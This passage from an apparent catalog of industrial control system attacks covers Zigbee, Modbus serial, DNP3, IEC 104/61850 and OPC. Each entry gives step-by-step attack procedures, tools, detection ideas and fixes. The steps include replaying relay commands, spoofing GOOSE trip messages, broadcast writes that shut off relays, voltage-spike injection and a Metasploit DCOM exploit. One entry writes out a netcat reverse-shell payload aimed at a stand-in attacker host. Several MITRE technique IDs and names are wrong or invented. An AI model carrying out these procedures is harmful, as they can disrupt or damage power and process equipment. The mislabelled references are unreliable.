- **Attack Steps**: Step 1: Use CC2531 dongle to passively sniff encrypted Zigbee packets. (Tool: CC2531, KillerBee)Step 2: Capture packets from actuator-bound traffic (e.g., valve open).Step 3: Use zbreplay.py to resend captured packets after timed delay. (Tool: zbreplay.py)Step 4: Observe actuator performing the same command again.Step 5: Repeat to test for repeated execution.Step 6: Confirm system does not use nonce tracking or anti-replay checks.
- **Detection**: Zigbee nonce/sequence anomaly detection
- **Solution**: Implement nonce tracking and expiration
- **Tags**: Zigbee, Encrypted Replay

## Modbus RTU Timing Side-Channel Scan

- **Attack Type**: Serial Reconnaissance
- **Target**: Serial Modbus Devices
- **Vulnerability**: Predictable timing variation per device type
- **MITRE**: T1592 - Gather Victim Identity
- **Impact**: Fingerprinting of devices for targeting
- **Tools**: Python + pyModbus, stopwatch timer
- **Scenario**: Attacker infers device type and function by analyzing response times over serial Modbus.
- **Attack Steps**: Step 1: Send function code 03 (read holding registers) to every address 1–247. (Tool: pyModbus)Step 2: Log response time per ID.Step 3: Devices like energy meters respond faster/slower than relays or valves.Step 4: Build timing fingerprint profile.Step 5: Use to predict device type and criticality.Step 6: Prepare targeted payloads accordingly.
- **Detection**: Response latency deviation analysis
- **Solution**: Add response randomization
- **Tags**: Modbus, Timing Side-Channel

## Zigbee Sniffer-to-Injection Attack Chain

- **Attack Type**: Wireless Chain Attack
- **Target**: Zigbee Sensor
- **Vulnerability**: Lack of message integrity/authentication
- **MITRE**: T1565 - Data Manipulation
- **Impact**: Induced panic or misinformed reaction
- **Tools**: CC2531, zbdump, zb_inject.py
- **Scenario**: A two-phase attack where the attacker first sniffs Zigbee traffic then uses that info to craft malicious responses.
- **Attack Steps**: Step 1: Passively sniff Zigbee communication using zbdump. (Tool: CC2531, zbdump)Step 2: Extract frame format, endpoint ID, and cluster ID.Step 3: Use zb_inject.py to craft fake sensor responses (e.g., high temperature). (Tool: zb_inject.py)Step 4: Inject packets timed with expected sensor update intervals.Step 5: SCADA accepts malicious reading.Step 6: Use multiple injections to simulate fluctuating danger.
- **Detection**: Correlate injected value vs actual logs
- **Solution**: Add message authentication and whitelist sensors
- **Tags**: Zigbee, Injection

## RS-485 Tap-and-Jam Attack

- **Attack Type**: Serial Hybrid Attack
- **Target**: RS-485 Modbus
- **Vulnerability**: No feedback confirmation loop
- **MITRE**: T1557 - Man-in-the-Middle
- **Impact**: Desynchronization of SCADA state vs physical state
- **Tools**: RS-485 clip, USB-RS485, signal blocker
- **Scenario**: Attacker passively taps serial Modbus while injecting interference selectively to disrupt writes.
- **Attack Steps**: Step 1: Tap RS-485 bus using passive clamp. (Tool: RS-485 clip)Step 2: Monitor traffic and identify Write Multiple Registers operations.Step 3: Time signal blocker to jam only during those writes. (Tool: signal blocker)Step 4: Result: SCADA believes operation was successful but it failed.Step 5: Log mismatch between command and real outcome.Step 6: Repeat to induce undetected process desync.
- **Detection**: Command vs sensor readback mismatch
- **Solution**: Use command acknowledgment + feedback checks
- **Tags**: Modbus, Tap, Partial Jam

## Zigbee Frequency Drift Injection

- **Attack Type**: Wireless PHY Layer Exploit
- **Target**: Zigbee Nodes
- **Vulnerability**: Susceptible to nearby frequency spoofing
- **MITRE**: T1582 - Exploit Signal Processing
- **Impact**: Fake commands or communication loss
- **Tools**: SDR (HackRF), custom RF modulator
- **Scenario**: Attacker injects packets slightly off Zigbee center frequency, confusing lower-quality receivers.
- **Attack Steps**: Step 1: Analyze Zigbee center frequency (e.g., 2.405 GHz). (Tool: HackRF)Step 2: Craft RF packets shifted by ±100 kHz.Step 3: Transmit repeated near-frequency frames.Step 4: Some devices with poor filtering lock onto fake frame.Step 5: Monitor dropped real frames or misfires.Step 6: Exploit poor frequency selectivity.
- **Detection**: RF frequency overlap detection
- **Solution**: Add hardware filtering, use spread spectrum
- **Tags**: Zigbee, RF Layer Exploit

## Modbus Serial Bit Flip Exploit

- **Attack Type**: Data Integrity Attack
- **Target**: RTU/PLC
- **Vulnerability**: No range/value enforcement on input
- **MITRE**: T1565.001 - Stored Data Manipulation
- **Impact**: Unintended device behavior
- **Tools**: pyserial, RS-485 injector
- **Scenario**: Physical bit flips in payload cause invalid readings or cause the device to execute undefined logic.
- **Attack Steps**: Step 1: Use RS-485 connection to send Modbus Write Register packet. (Tool: pyserial)Step 2: Flip random bits in the data field using script.Step 3: Some slaves may interpret 0xFFFF as a negative value or trigger edge logic.Step 4: Monitor SCADA for unexpected value changes.Step 5: Observe device behavior for logic fault.Step 6: Repeat to map vulnerable register ranges.
- **Detection**: Analyze out-of-spec register values
- **Solution**: Add logic-level bounds checking
- **Tags**: Modbus, Bit Flip

## Zigbee Hidden Endpoint Enumeration

- **Attack Type**: Wireless Recon
- **Target**: Zigbee End Devices
- **Vulnerability**: No endpoint filtering or lockdown
- **MITRE**: T1592.004 - Hardware Identification
- **Impact**: Precursor to function abuse
- **Tools**: zbscan.py, Zigbee frame injector
- **Scenario**: Attacker uncovers hidden endpoints and unsupported clusters by brute forcing cluster IDs.
- **Attack Steps**: Step 1: Use zbscan.py to iterate through endpoint and cluster IDs. (Tool: zbscan.py)Step 2: Monitor which IDs generate responses vs errors.Step 3: Identify hidden diagnostics or vendor-specific endpoints.Step 4: Log supported clusters and commands.Step 5: Use later for privilege escalation attacks.Step 6: Match against known vulnerable endpoint signatures.
- **Detection**: Cluster ID response profiling
- **Solution**: Harden Zigbee stack to deny unknowns
- **Tags**: Zigbee, Endpoint Scan

## Serial Bus Saturation via Interleaved Writes

- **Attack Type**: Serial Denial of Service
- **Target**: Modbus Slaves
- **Vulnerability**: No QoS or input queue rate control
- **MITRE**: T1499 - DoS
- **Impact**: Device unresponsiveness
- **Tools**: Python + modbus-tk, RS-485 cable
- **Scenario**: Attacker sends writes with alternating payload lengths, choking processing queues.
- **Attack Steps**: Step 1: Connect to RS-485 and start injecting Write Registers requests. (Tool: modbus-tk)Step 2: Alternate payload length rapidly between 2 and 120 registers.Step 3: Some devices take longer to parse large packets, delaying queue.Step 4: Starvation causes delayed response to legitimate master.Step 5: SCADA shows timeout errors.Step 6: Record device lockups or watchdog triggers.
- **Detection**: Modbus response time deviation alerts
- **Solution**: Throttle max payloads per request
- **Tags**: Modbus, Saturation

## Zigbee PAN Null Join Confusion

- **Attack Type**: Wireless Join Exploit
- **Target**: Zigbee Mesh Devices
- **Vulnerability**: No handling for null PANs
- **MITRE**: T1557.002 - Rogue Device
- **Impact**: Network instability during commissioning
- **Tools**: zbassocflood.py, Zigbee sniffer
- **Scenario**: Rogue device advertises PAN ID as 0x0000, confusing devices during joining and forcing them to stall.
- **Attack Steps**: Step 1: Use zbassocflood.py to advertise PAN ID 0x0000. (Tool: zbassocflood.py)Step 2: New devices trying to join may get confused and reject join.Step 3: Existing devices may try to reconfigure.Step 4: Observe mass disconnects and log floods.Step 5: Zigbee coordinator remains unaware.Step 6: Monitor for join failures and address resets.
- **Detection**: Join failure statistics
- **Solution**: Reject null/zero PAN IDs in firmware
- **Tags**: Zigbee, PAN Confusion

## Modbus Serial Delay Amplification

- **Attack Type**: Serial Performance Attack
- **Target**: SCADA Master
- **Vulnerability**: No response-time anomaly detection
- **MITRE**: T1499.002 - Service Degradation
- **Impact**: Slowdown of overall operations
- **Tools**: USB-RS485, pymodbus server
- **Scenario**: Attacker responds with valid but delayed acknowledgments to increase SCADA’s polling cycle time.
- **Attack Steps**: Step 1: Use pymodbus to emulate a slave device. (Tool: pymodbus)Step 2: Delay ACK responses by exactly 900ms (just under 1s timeout).Step 3: SCADA waits full timeout before each transaction.Step 4: System becomes sluggish without clear error.Step 5: Operators may mistake for device slowness or overload.Step 6: Multiply across devices to amplify overall delay.
- **Detection**: Polling cycle profiling
- **Solution**: Implement upper delay thresholds per slave
- **Tags**: Serial, Delay, ACK Slowness

## Zigbee Bind Request Hijack

- **Attack Type**: Wireless Session Hijack
- **Target**: Zigbee Sensor
- **Vulnerability**: No authentication on binding requests
- **MITRE**: T1557 - Man-in-the-Middle
- **Impact**: Sensor data hijacked
- **Tools**: CC2531, Zigbee Toolkit, zb_bind_attack.py
- **Scenario**: Attacker sends bind requests to Zigbee devices to redirect their reports to rogue endpoints.
- **Attack Steps**: Step 1: Use CC2531 to sniff traffic and identify endpoint/device addresses. (Tool: CC2531)Step 2: Use Zigbee Toolkit to craft Bind_Request with attacker's endpoint as the destination. (Tool: zb_bind_attack.py)Step 3: Send bind request during known inactivity window.Step 4: Target device starts sending telemetry to rogue node.Step 5: Rogue node can now relay or modify reports.Step 6: Monitor SCADA for inaccurate sensor values.
- **Detection**: Monitor destination address mismatches
- **Solution**: Restrict binding to certified IDs
- **Tags**: Zigbee, Bind Hijack

## Modbus Broadcast Write Abuse

- **Attack Type**: Serial Protocol Abuse
- **Target**: Modbus RTU Network
- **Vulnerability**: No restriction on broadcast writes
- **MITRE**: T0896 - Command and Control Protocol
- **Impact**: Mass effect on field devices
- **Tools**: modpoll, USB-RS485 cable
- **Scenario**: Attacker uses broadcast slave ID 0 to trigger a write across all Modbus RTU devices at once.
- **Attack Steps**: Step 1: Connect to Modbus serial network using USB-RS485. (Tool: USB-RS485)Step 2: Use modpoll with slave ID set to 0. (Tool: modpoll)Step 3: Send Write Single Coil or Register command (e.g., turning off relays).Step 4: All devices on the bus accept the command simultaneously.Step 5: Monitor physical process for mass failure or shutdown.Step 6: SCADA may not detect the attack due to lack of ACK from broadcast.
- **Detection**: Detect lack of response ACKs
- **Solution**: Block broadcast write support in firmware
- **Tags**: Modbus, Broadcast Exploit

## Zigbee Beacon Spoof to Force Rejoin

- **Attack Type**: Wireless Disruption
- **Target**: Zigbee Mesh Devices
- **Vulnerability**: Weak coordinator trust model
- **MITRE**: T1499.004 - Clock Skew/Sync Attack
- **Impact**: Device isolation via fake network
- **Tools**: HackRF, GNURadio, Zigbee Beacon Faker
- **Scenario**: Attacker sends fake Zigbee coordinator beacons with higher signal to cause rejoin attempts and traffic loss.
- **Attack Steps**: Step 1: Use HackRF and GNURadio to broadcast Zigbee beacon frames. (Tool: HackRF, GNURadio)Step 2: Use same PAN ID but set beacon signal strength high.Step 3: Legitimate end-devices begin rejoining the stronger (fake) coordinator.Step 4: Fake coordinator does not respond or delays.Step 5: Devices go into reconnect loops or offline mode.Step 6: SCADA loses sensor updates across the mesh.
- **Detection**: PAN change frequency analysis
- **Solution**: Use signed beacons and coordinated handshakes
- **Tags**: Zigbee, Beacon Attack

## Serial Bus Electrical Overload

- **Attack Type**: Physical Line Attack
- **Target**: RS-485 Modbus Bus
- **Vulnerability**: No surge protection or isolation
- **MITRE**: T0813 - DoS
- **Impact**: Hardware damage or resets
- **Tools**: Signal injector, RS-485 injector, multimeter
- **Scenario**: Attacker injects voltage spikes into RS-485 line to disrupt or damage devices.
- **Attack Steps**: Step 1: Connect signal injector inline with RS-485 bus. (Tool: RS-485 injector)Step 2: Inject voltage spikes (e.g., +12V bursts). (Tool: Signal Injector)Step 3: Observe communication errors, reboots, or smoke in worst case.Step 4: Use multimeter to track voltage changes. (Tool: Multimeter)Step 5: Remove injector and observe if devices recover.Step 6: Document tolerance level for simulation logs.
- **Detection**: Line voltage spike detection
- **Solution**: Add TVS diodes and opto-isolators
- **Tags**: Serial, Surge Injection

## Zigbee Hidden OTA Firmware Endpoint Enumeration

- **Attack Type**: Wireless Recon
- **Target**: Zigbee Devices
- **Vulnerability**: OTA endpoints exposed without access control
- **MITRE**: T1592.004 - Identify Firmware Capabilities
- **Impact**: Enables future firmware manipulation
- **Tools**: zbscan, CC2531, OTAFrameAnalyzer
- **Scenario**: Attacker scans for OTA update clusters and endpoints to identify firmware update paths for later abuse.
- **Attack Steps**: Step 1: Use CC2531 with zbscan to sniff OTA cluster traffic. (Tool: zbscan, CC2531)Step 2: Identify devices that expose endpoint 0x0001 (common OTA endpoint).Step 3: Confirm existence of ZCL cluster 0x0019 (OTA Update). (Tool: OTAFrameAnalyzer)Step 4: Log active endpoints accepting OTA commands.Step 5: Correlate with device model/vendor.Step 6: Store for future targeted downgrade or backdoor attack.
- **Detection**: Monitor OTA cluster traffic
- **Solution**: Secure endpoint whitelisting
- **Tags**: Zigbee, OTA Recon

## DNP3 Command Injection to Change Relay State

- **Attack Type**: DNP3 Protocol Injection
- **Target**: DNP3-enabled relay
- **Vulnerability**: Lack of authentication in legacy DNP3
- **MITRE**: T0853.001 (Protocol Manipulation)
- **Impact**: Remote control of electrical equipment
- **Tools**: Scapy, Wireshark, DNP3-Fuzzer
- **Scenario**: An attacker sends unauthorized "Operate" commands over DNP3 to switch a remote relay connected to a substation, simulating malicious control.
- **Attack Steps**: Step 1: Set up a test environment with a DNP3-enabled relay (physical or simulated).Step 2: Connect the attacker’s system to the same network or segment where DNP3 traffic is observed.Step 3: Use Wireshark to capture DNP3 traffic and identify device IDs and function codes.Step 4: Launch Scapy or a custom DNP3 tool to craft packets with Function Code 05 (Operate).Step 5: Spoof the source IP to appear as a legitimate Master.Step 6: Send the operate command repeatedly until relay responds.Step 7: Observe change in relay behavior (e.g., switching states or tripping).
- **Detection**: Monitor unexpected DNP3 command frequency and source IPs
- **Solution**: Enforce secure DNP3 (with authentication), isolate control traffic
- **Tags**: dnp3, protocol-injection, relay-control

## IEC 104 Spoofed Interrogation Command

- **Attack Type**: IEC 60870-5-104 Interrogation Spoofing
- **Target**: IEC 104 RTU
- **Vulnerability**: No authentication in IEC 104
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Unauthorized access to process data
- **Tools**: IEC 104 Toolkit, Wireshark, Ettercap
- **Scenario**: The attacker injects an interrogation command (C_IC_NA_1) to trigger unsolicited data responses from RTU and monitor system status in real time.
- **Attack Steps**: Step 1: Set up a lab with RTU and HMI using IEC 104 protocol.Step 2: Capture normal IEC 104 traffic using Wireshark.Step 3: Identify U and I frame structure, ASDU types.Step 4: Use IEC 104 Toolkit or Scapy to generate a C_IC_NA_1 command.Step 5: Spoof the attacker’s IP to match HMI's IP.Step 6: Inject the command into the network.Step 7: RTU sends data responses back to attacker, allowing state monitoring.
- **Detection**: Analyze unexpected data response patterns
- **Solution**: Use VPN/IPSec tunnel, whitelist HMI IPs
- **Tags**: iec104, sniffing, command-spoof

## OPC Classic DCOM Exploitation

- **Attack Type**: OPC Protocol Abuse
- **Target**: Engineering Workstation
- **Vulnerability**: Unpatched DCOM vulnerability in OPC
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: Remote code execution, lateral movement
- **Tools**: Metasploit, Prosys OPC Simulation, Nmap
- **Scenario**: Exploiting legacy OPC Classic servers using DCOM to execute commands on engineering workstation hosting the OPC server.
- **Attack Steps**: Step 1: Scan for OPC Classic services using Nmap or Prosys OPC Client.Step 2: Identify open DCOM ports (135, 139, 445).Step 3: Use Metasploit's exploit/windows/dcerpc/ms03_026_dcom module.Step 4: Set RHOST to the OPC server IP.Step 5: Configure payload to launch reverse shell.Step 6: Exploit the DCOM interface and gain remote shell.Step 7: From the shell, interact with the process control software or OPC namespace.
- **Detection**: Monitor DCOM connections, unusual shell activity
- **Solution**: Upgrade to OPC UA, patch DCOM services, use firewall
- **Tags**: opc, dcom, windows-exploit

## DNP3 Sequence Number Desynchronization

- **Attack Type**: Protocol Desync
- **Target**: DNP3 Master-Slave Channel
- **Vulnerability**: No sequence integrity checks
- **MITRE**: T0810 (Data Destruction)
- **Impact**: Communication outage, data integrity loss
- **Tools**: Scapy, DNP3-Fuzzer, Wireshark
- **Scenario**: An attacker floods the DNP3 channel with out-of-sequence packets to desynchronize master-slave communication, causing data loss or delays.
- **Attack Steps**: Step 1: Analyze a DNP3 session using Wireshark to find the last used sequence number.Step 2: Use Scapy to send multiple DNP3 packets with manipulated sequence numbers.Step 3: Intentionally mix sequence numbers to simulate partial replay and injection.Step 4: Monitor master-slave communication—delays or dropped updates should occur.Step 5: Observe system alarms or user confusion at HMI due to inconsistent data.Step 6: Reset communication and repeat to test robustness.
- **Detection**: Packet sequence monitoring tools
- **Solution**: Use sequence validation, anomaly detection on packet flow
- **Tags**: dnp3, sequence-flood, dos

## IEC 104 Data Injection to Falsify Alarm

- **Attack Type**: IEC 104 Alarm Injection
- **Target**: IEC 104-Controlled HMI
- **Vulnerability**: No validation of data origin
- **MITRE**: T1565.001 (Stored Data Manipulation)
- **Impact**: Operational confusion, false shutdowns
- **Tools**: IEC 104 Client Emulator, Scapy, Wireshark
- **Scenario**: Injecting a fabricated alarm condition (e.g., over-temperature) using a crafted IEC 104 packet to deceive operators.
- **Attack Steps**: Step 1: Set up IEC 104 client-server pair (can be simulated with open-source tools).Step 2: Monitor ASDU format for alarm messages (e.g., M_SP_NA_1 for single-point status).Step 3: Craft an IEC 104 packet with an alarm value and timestamp.Step 4: Spoof legitimate master IP and send the packet.Step 5: HMI displays false alarm, misleading operator.Step 6: Observe operator response to false signal.Step 7: Log incident and verify detection mechanisms.
- **Detection**: Compare alarm timestamps with device logs
- **Solution**: Secure channel enforcement, packet validation
- **Tags**: false-alarms, iec104, operator-deception

## OPC UA Subscription Flood Attack

- **Attack Type**: OPC UA Resource Exhaustion
- **Target**: OPC UA Server
- **Vulnerability**: No throttle or rate-limiting
- **MITRE**: T1499.004 (Resource Hijacking)
- **Impact**: Server crash, denial of data access
- **Tools**: UAExpert, Prosys OPC UA Simulation Server
- **Scenario**: Overloading an OPC UA server by subscribing to thousands of monitored items rapidly, consuming memory and CPU.
- **Attack Steps**: Step 1: Launch Prosys OPC UA Server in a lab environment.Step 2: Start UAExpert Client and connect to the server using endpoint URI.Step 3: Browse the server tree and identify common tags.Step 4: Begin creating new subscriptions for monitored items in a tight loop (using script or tool).Step 5: Continue until server CPU/memory begins to degrade.Step 6: Log the performance hit or server crash behavior.Step 7: Disconnect and analyze server logs.
- **Detection**: OPC UA logs, server performance monitor
- **Solution**: Enforce subscription limits, use DoS protections
- **Tags**: opc-ua, flood, performance-attack

## DNP3 Replay Attack to Confuse Operator Logs

- **Attack Type**: Replay Attack
- **Target**: DNP3 Relay System
- **Vulnerability**: Lack of replay protection
- **MITRE**: T1001.003 (Protocol Impersonation)
- **Impact**: Operator confusion, log integrity loss
- **Tools**: Wireshark, Scapy, DNP3 Replayer
- **Scenario**: Replay of legitimate “Trip” and “Close” DNP3 commands to mimic operator action falsely.
- **Attack Steps**: Step 1: Capture DNP3 traffic during normal relay control using Wireshark.Step 2: Extract packets containing Function Code 5 (Operate).Step 3: Use Scapy with DNP3 extension or custom script to resend captured packet.Step 4: Replay both "Trip" and "Close" commands in sequence with legitimate-looking timestamps.Step 5: Monitor HMI logs – they show the action as if initiated by an operator.Step 6: Verify if audit logs mismatch with actual user sessions.Step 7: Confirm system accepted spoofed commands.
- **Detection**: Compare timestamped logs vs operator login
- **Solution**: Use secure DNP3 version or timestamps w/ MAC
- **Tags**: dnp3, replay, operator-deception

## IEC 104 GOOSE Message Spoofing

- **Attack Type**: IEC 61850 GOOSE Spoof
- **Target**: IEC 61850 Devices
- **Vulnerability**: No authentication in GOOSE
- **MITRE**: T0853.001
- **Impact**: False shutdowns, unsafe trips
- **Tools**: GOOSE Publisher (OpenMUC), Wireshark
- **Scenario**: Sending fake Generic Object Oriented Substation Event (GOOSE) messages to trigger false control events.
- **Attack Steps**: Step 1: Simulate a substation environment with GOOSE-capable RTUs.Step 2: Use Wireshark to capture GOOSE traffic and note the MAC and AppID fields.Step 3: Set up OpenMUC GOOSE Publisher with same identifiers as a legitimate source.Step 4: Craft a GOOSE frame simulating trip condition.Step 5: Inject GOOSE message via switch-connected attacker machine.Step 6: Target IED responds by triggering breaker or alarm.Step 7: Validate event via logs and observe misbehavior.
- **Detection**: GOOSE replay detection via IED
- **Solution**: Use GOOSE security extensions (IEC 62351)
- **Tags**: goose, iec61850, spoof

## OPC Classic Remote Tag Enumeration

- **Attack Type**: Information Disclosure
- **Target**: OPC Classic Server
- **Vulnerability**: Insecure anonymous browsing
- **MITRE**: T1082 (System Information Discovery)
- **Impact**: Revealed full ICS structure
- **Tools**: OPC Client (Matrikon Explorer), Wireshark
- **Scenario**: Attacker queries OPC Classic server to extract all active tags and structure, revealing process data.
- **Attack Steps**: Step 1: Discover OPC Classic server IP using Nmap.Step 2: Connect to server using Matrikon OPC Explorer.Step 3: Browse tag groups and expand branches recursively.Step 4: Note down process variables, alarms, and control points.Step 5: Save tag tree and value history locally.Step 6: (Optional) Use Wireshark to observe tag data transfer.Step 7: Log sensitive data for enumeration report.
- **Detection**: Monitor client browsing sessions
- **Solution**: Use OPC UA with access control
- **Tags**: opc, tag-discovery, classic

## DNP3 Master Spoof via MAC/IP Cloning

- **Attack Type**: Identity Spoofing
- **Target**: DNP3 Slave Device
- **Vulnerability**: MAC/IP trust without authentication
- **MITRE**: T1557 (Man-in-the-Middle)
- **Impact**: Full impersonation of master device
- **Tools**: Ettercap, Scapy, Macchanger
- **Scenario**: Attacker mimics legitimate Master by cloning MAC/IP and issuing commands.
- **Attack Steps**: Step 1: Monitor ARP traffic on ICS segment using Ettercap.Step 2: Identify Master MAC/IP pair communicating with slave.Step 3: Use Macchanger to spoof MAC address.Step 4: Assign same IP address using ifconfig.Step 5: Disable Master temporarily via DoS (optional).Step 6: Use Scapy to send Function Code 03 (Select) and 05 (Operate) commands.Step 7: Observe slave executes command from attacker.
- **Detection**: MAC spoofing detection tools
- **Solution**: Secure channel authentication
- **Tags**: dnp3, spoof, identity-theft

## IEC 104 Session Hijacking

- **Attack Type**: Session Takeover
- **Target**: IEC 104 TCP Session
- **Vulnerability**: No session encryption or auth
- **MITRE**: T1563.001 (Session Hijack)
- **Impact**: Unauthorized data injection
- **Tools**: Wireshark, TCPdump, Ettercap
- **Scenario**: Hijacking an existing IEC 104 TCP session to inject or alter ASDU messages.
- **Attack Steps**: Step 1: Start capturing IEC 104 session using Wireshark.Step 2: Identify session tuple (IP:port) and sequence numbers.Step 3: Pause master traffic using DoS (e.g., ARP poisoning via Ettercap).Step 4: Craft ASDU (e.g., status change) with correct sequence number.Step 5: Inject packet into hijacked session.Step 6: Observe successful data update on HMI without legitimate Master knowledge.Step 7: Verify logs show spoofed entry.
- **Detection**: Compare session states, alert on TCP resets
- **Solution**: Secure sessions via VPN/IEC 62351
- **Tags**: iec104, hijack, tcp-injection

## OPC UA Reverse Shell via Misconfigured Method Node

- **Attack Type**: Remote Code Execution
- **Target**: OPC UA Server
- **Vulnerability**: Exposed insecure method nodes
- **MITRE**: T1059 (Command & Scripting)
- **Impact**: Remote access to server
- **Tools**: UA Expert, Python-opcua, Netcat
- **Scenario**: Attacker leverages an exposed custom Method node in OPC UA to execute arbitrary system commands.
- **Attack Steps**: Step 1: Scan OPC UA endpoint using UA Expert to find Method nodes.Step 2: Identify method nodes that accept string arguments (e.g., shell command).Step 3: Connect via Python-opcua script.Step 4: Call method with payload like nc attacker-ip 4444 -e /bin/sh.Step 5: On attacker's system, start listener with Netcat.Step 6: Upon method execution, gain reverse shell.Step 7: Interact with system and capture data.
- **Detection**: Audit OPC UA method calls
- **Solution**: Restrict methods & sanitize inputs
- **Tags**: opc-ua, rce, reverse-shell

## DNP3 Null Scan to Map Devices

- **Attack Type**: DNP3 Device Discovery
- **Target**: DNP3 Device Network
- **Vulnerability**: No input validation
- **MITRE**: T1595 (Active Scanning)
- **Impact**: ICS fingerprinting
- **Tools**: DNP3-Fuzzer, Wireshark
- **Scenario**: Using malformed or "empty" function codes to enumerate device responses.
- **Attack Steps**: Step 1: Connect to ICS test network with DNP3 devices.Step 2: Use DNP3-Fuzzer to send zeroed function code packets.Step 3: Devices reply with error codes or metadata depending on implementation.Step 4: Analyze responses with Wireshark to map device type, location, and ID.Step 5: Repeat with different function codes and addresses.Step 6: Build network map from findings.Step 7: Document fingerprinting results.
- **Detection**: Monitor malformed DNP3 packets
- **Solution**: Validate inputs, detect fuzz attempts
- **Tags**: dnp3, discovery, fuzz

## IEC 104 ASDU Flooding

- **Attack Type**: Denial of Service
- **Target**: IEC 104 Slave
- **Vulnerability**: No rate-limit in stack
- **MITRE**: T1499.001 (Endpoint DoS)
- **Impact**: Device crash, process loss
- **Tools**: Scapy, IEC 104 Python Library
- **Scenario**: Flooding IEC 104 slave device with continuous unsolicited ASDUs.
- **Attack Steps**: Step 1: Launch Python script using IEC 104 library.Step 2: Craft ASDU packets with invalid or redundant data.Step 3: Send a high rate of packets over TCP to target device.Step 4: Observe rising CPU/memory usage on the slave device.Step 5: Eventually slave becomes unresponsive or drops connections.Step 6: Confirm DoS condition.Step 7: Review logs for flood patterns.
- **Detection**: Monitor ASDU rate & anomalies
- **Solution**: Apply traffic shaping, validate ASDU
- **Tags**: iec104, dos, flood

## OPC Classic DLL Hijacking via Misconfigured COM Path

- **Attack Type**: DLL Injection
- **Target**: OPC Classic Windows Host
- **Vulnerability**: DLL path misconfiguration
- **MITRE**: T1574.001 (DLL Search Order Hijacking)
- **Impact**: Full system compromise
- **Tools**: ProcMon, DLLSpy, Metasploit
- **Scenario**: Injecting malicious DLL into OPC Classic COM path to escalate privileges.
- **Attack Steps**: Step 1: Identify COM DLL paths via ProcMon on target OPC server.Step 2: Note DLLs loaded from writable directories.Step 3: Use Metasploit to generate malicious DLL payload.Step 4: Upload payload using lateral access or USB.Step 5: Rename DLL to match expected filename.Step 6: Restart OPC service to load payload.Step 7: Payload executes under SYSTEM privileges.
- **Detection**: Monitor DLL loading via Sysmon
- **Solution**: Restrict write access to DLL paths
- **Tags**: opc, dll-injection, privilege-escalation

## IEC 104 Spoofed Time Sync Attack

- **Attack Type**: Time Manipulation
- **Target**: IEC 104 RTU
- **Vulnerability**: No time validation or sync control
- **MITRE**: T1602 (Data Manipulation)
- **Impact**: Alarm desync, audit corruption
- **Tools**: Scapy, IEC 104 Python Script, Wireshark
- **Scenario**: The attacker sends spoofed "Set Clock Time" commands to shift system clocks in RTUs, desynchronizing logs and alarms.
- **Attack Steps**: Step 1: Capture IEC 104 traffic with Wireshark to find control commands related to time sync (ASDU type 103).Step 2: Identify source IP and structure of "Set Clock Time" packets.Step 3: Use Python + IEC 104 library or Scapy to craft packets with false time.Step 4: Inject the spoofed packet targeting RTU.Step 5: Observe RTU time shift via HMI or log entries.Step 6: Analyze how misalignment affects alarms, scheduled tasks.Step 7: Revert and compare logs pre/post attack.
- **Detection**: Time offset detection in logs
- **Solution**: Authenticated time sync (NTP+signing)
- **Tags**: iec104, time-desync, audit-fraud

## OPC UA Node Injection Attack

- **Attack Type**: Data Tampering
- **Target**: OPC UA Server
- **Vulnerability**: Uncontrolled node access
- **MITRE**: T1565.002 (Data Manipulation - Transmitted)
- **Impact**: False alarms, operator panic
- **Tools**: UA Expert, Prosys UA SDK, Python-opcua
- **Scenario**: Injecting a new unauthorized variable (Node) into the OPC UA server address space to trick operators.
- **Attack Steps**: Step 1: Connect to OPC UA server using UA Expert.Step 2: Identify writable folders or existing variable nodes.Step 3: Use Python-opcua script to create a new node with a misleading name (e.g., "Temp_Overload").Step 4: Set high critical values and write them as live data.Step 5: Monitor HMI or client system and observe alarm trigger or operator reaction.Step 6: Log data flow and prove falsification.Step 7: Delete node post-test.
- **Detection**: OPC UA node audit log review
- **Solution**: Implement write permissions & RBAC
- **Tags**: opcua, node-injection, alert-fake

## DNP3 Unsolicited Response Injection

- **Attack Type**: Spoofed Update Injection
- **Target**: DNP3 Master
- **Vulnerability**: Accepts unauthenticated updates
- **MITRE**: T0853 (Protocol Abuse)
- **Impact**: Misleading sensor behavior
- **Tools**: Scapy, Wireshark, DNP3-Fuzzer
- **Scenario**: Attacker sends unsolicited binary input updates to simulate fake sensor changes.
- **Attack Steps**: Step 1: Analyze unsolicited DNP3 messages using Wireshark.Step 2: Create custom unsolicited response packets using Scapy or DNP3-Fuzzer.Step 3: Modify sensor values to simulate status changes (e.g., pressure drop, switch open).Step 4: Send unsolicited messages directly to Master device.Step 5: Observe HMI display sudden status changes.Step 6: Monitor operator reaction and system logs.Step 7: Assess consequences of false indications.
- **Detection**: Track unsolicited response rate
- **Solution**: Use secure DNP3 (SAv5), whitelist responses
- **Tags**: dnp3, sensor-spoof, protocol-injection

## IEC 104 Flooding with Invalid Type IDs

- **Attack Type**: Protocol Abuse DoS
- **Target**: IEC 104 RTU
- **Vulnerability**: Insecure input validation
- **MITRE**: T1499.001 (Endpoint DoS)
- **Impact**: RTU crash or denial of visibility
- **Tools**: Scapy, IEC 104 Python Library
- **Scenario**: Flooding RTUs with malformed ASDUs using unsupported Type IDs, causing parsing errors.
- **Attack Steps**: Step 1: Review IEC 104 Type ID reference table.Step 2: Write a script using IEC 104 Python Library to send packets with Type IDs beyond valid range (e.g., 250+).Step 3: Send hundreds of these malformed packets to the RTU.Step 4: Monitor RTU CPU usage and log errors.Step 5: Observe crash or failure to respond after saturation.Step 6: Log downtime duration and recovery behavior.Step 7: Reboot and validate logs.
- **Detection**: RTU ASDU error logging
- **Solution**: Validate Type IDs, reject malformed packets
- **Tags**: iec104, dos, malformed

## OPC Classic COM Brute Enumeration

- **Attack Type**: Brute-force Tag Access
- **Target**: OPC Classic Server
- **Vulnerability**: No access control or tag discovery limits
- **MITRE**: T1592.002 (Tag Brute Force)
- **Impact**: Reveals control structure, allows data tampering
- **Tools**: Matrikon OPC Explorer, Brute Tag Script
- **Scenario**: Repeatedly querying unknown tag names to discover valid tag structure and permissions.
- **Attack Steps**: Step 1: Connect to OPC Classic server using Matrikon Explorer.Step 2: Write a brute-tag script to query tags with patterns like Tag001, Tag002...Step 3: Record which tag queries return data vs. errors.Step 4: Log discovered tag names and permission levels.Step 5: Use valid tag names to read/write test data.Step 6: Check for access control weaknesses.Step 7: Compare found tags against official documentation.
- **Detection**: OPC tag access logging
- **Solution**: Implement tag whitelisting and brute attempt lockout
- **Tags**: opc, brute-force, tag-enum

## IEC 104 Conficker-style Propagation

